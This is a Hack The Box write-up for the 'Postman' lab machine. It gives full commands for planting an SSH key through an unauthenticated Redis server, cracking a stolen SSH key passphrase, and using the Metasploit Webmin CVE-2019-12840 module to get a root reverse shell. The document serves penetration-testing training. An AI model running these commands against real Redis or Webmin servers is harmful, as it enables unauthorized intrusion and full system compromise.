# Hack The Box: Postman

**Difficulty:** Easy
**OS:** Linux

Postman is an Easy difficulty Linux machine that demonstrates the dangers of exposing internal services, specifically Redis, to the public internet without adequate authentication. The machine also features a Webmin interface vulnerable to a known Remote Code Execution (RCE) exploit once valid credentials are obtained. Privilege escalation is achieved by locating an unencrypted SSH private key.

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.10.160
nmap -p 22,80,6379,10000 -sCV 10.10.10.160
```

The scan reveals four open ports:
*   **Port 22:** SSH (OpenSSH)
*   **Port 80:** HTTP (Apache)
*   **Port 6379:** Redis (key-value store)
*   **Port 10000:** Webmin (MiniServ 1.910)

Browsing to the web server on port 80 shows a static landing page for a delivery service without any obvious interactive elements or input vectors. Directory enumeration does not yield significant results. We therefore turn our attention to the exposed Redis and Webmin services.

## Initial Access

### Exploiting Exposed Redis (Port 6379)

Redis is an in-memory data structure store. Often, it is deployed without authentication, allowing anyone who can reach the port to read and write data.

We interact with the Redis server using the `redis-cli` tool. Testing the connection reveals that it does not require a password.

```bash
redis-cli -h 10.10.10.160
10.10.10.160:6379> ping
PONG
```

A common exploitation technique for an exposed Redis instance is to overwrite a user's `authorized_keys` file to gain SSH access. This requires knowing or guessing a valid username on the system.

We generate a new SSH key pair on our local attacking machine.

```bash
ssh-keygen -t rsa -f mykey
```

We format the public key to ensure it is written correctly into the Redis memory structure by adding newlines.

```bash
(echo -e "\n\n"; cat mykey.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
```

Next, we configure Redis to write its database dump into the `.ssh` directory of a local user. The user `redis` is a standard service account created during installation, so we target its home directory `/var/lib/redis/.ssh`.

```bash
redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh/
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
```

With the `authorized_keys` file successfully overwritten, we use our generated private key to SSH into the machine as the `redis` user.

```bash
ssh -i mykey redis@10.10.10.160
# Authentication successful
```
We now have an initial foothold on the system.

## Lateral Movement

As the `redis` user, we explore the filesystem to find a way to pivot to a standard user account to read the `user.txt` flag.

Checking the `/home` directory reveals a user named `Matt`. We cannot access his directory directly. However, searching the filesystem for backup files or SSH keys reveals an interesting file.

```bash
find / -name "id_rsa" 2>/dev/null
```

We locate an SSH private key backup at `/opt/id_rsa.bak`.

```bash
cat /opt/id_rsa.bak
```

We copy this private key to our attacking machine. Attempting to use the key to SSH as `Matt` prompts for a passphrase. 

```bash
ssh -i matt_key matt@10.10.10.160
Enter passphrase for key 'matt_key':
```

We must crack the passphrase. We use `ssh2john` to convert the key into a format hashcat or John the Ripper can understand.

```bash
ssh2john matt_key > matt_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt matt_hash.txt
```

John the Ripper successfully cracks the hash, revealing the passphrase: `computer2008`.

We can now authenticate via `su` as the user `Matt` from our existing SSH session, or attempt to SSH directly using the key and the cracked passphrase.

```bash
su matt
Password: computer2008
# id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```
We retrieve the `user.txt` flag from Matt's home directory.

## Privilege Escalation

Our final objective is to obtain root access. During our initial enumeration, we identified Webmin running on port 10000. 

### Exploiting Webmin 1.910

We research the specific version of Webmin (1.910). This version is vulnerable to an authenticated Remote Code Execution (RCE) flaw in the Package Updates module (CVE-2019-12840).

Since we have valid credentials for the user `Matt` (`matt:computer2008`), we can log into the Webmin interface on port 10000 over HTTPS.

There is a readily available Metasploit module for this vulnerability, but it can also be exploited manually or with a standalone Python script.

Using the Metasploit framework:

```bash
msfconsole
msf> use exploit/linux/http/webmin_packageup_rce
msf> set RHOSTS 10.10.10.160
msf> set RPORT 10000
msf> set SSL true
msf> set USERNAME matt
msf> set PASSWORD computer2008
msf> set LHOST 10.10.14.X
msf> run
```

The exploit authenticates as `Matt` and injects a payload into the package update mechanism. Because Webmin runs with high privileges, the resulting reverse shell is established as the `root` user.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised and the `root.txt` flag is obtained.
